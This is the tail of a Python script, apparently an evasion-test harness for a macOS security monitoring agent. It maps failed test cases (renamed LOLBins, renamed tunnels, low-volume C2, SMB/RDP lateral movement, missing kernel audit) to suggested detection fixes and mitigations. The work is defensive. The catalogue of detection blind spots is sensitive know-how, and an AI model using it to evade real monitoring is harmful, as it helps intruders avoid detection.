        "th4_c2_under_min_hits": "Lower MIN_HITS to 2 or track across longer time windows",
        "cg1_masquerade_unknown_name": "Add temp-path check for ALL processes, not just known names",
        "cg2_lateral_smb": "Add lateral movement probes for SMB (445), RDP (3389), VNC (5900)",
        "cg3_nonstandard_unknown_service": "Flag ANY unknown process listening on non-ephemeral ports",
        "cg4_cleartext_private_ip": "Option to also check private IPs for cleartext (internal lateral movement)",
        "cg5_tunnel_renamed": "Already detected by port! But add behavioral analysis (SOCKS handshake patterns)",
        "cg6_login_business_hours": "Add geo-IP source analysis (unusual country) regardless of time",
        "nt1_tree_unknown_parent": "Add general 'script-tool spawned by unknown parent' rule",
        "nt2_lolbin_renamed": "Check exe binary hash against known LOLBin hashes, not just name",
        "nt3_persistence_wrong_category": "Add AtJobProbe with _target_categories=['at_job']",
        "ta1_impossible_travel_slow": "Increase TIME_WINDOW_SECONDS or add sliding window across cycles",
    }
    return ideas.get(t.id, "Needs investigation")


def _get_mitigation(t: EvasionTest) -> str:
    """Suggest a mitigation for an architectural gap."""
    mitigations = {
        "ab1_no_kernel_audit": "Compensate with 5ms psutil polling; deploy root agent for ESF on managed devices",
        "ab2_no_packet_inspection": "Use connection metadata (timing, volume, destination) for behavioral detection",
        "ab3_no_tcc_database": "Monitor via Unified Logging (partial) or deploy MDM-managed TCC profiles",
        "ab4_no_realtime_file_events": "Install watchdog or use kqueue; reduce scan_interval to 10s for critical paths",
    }
    return mitigations.get(t.id, "Accept risk or escalate to root deployment")


if __name__ == "__main__":
    sys.exit(main())
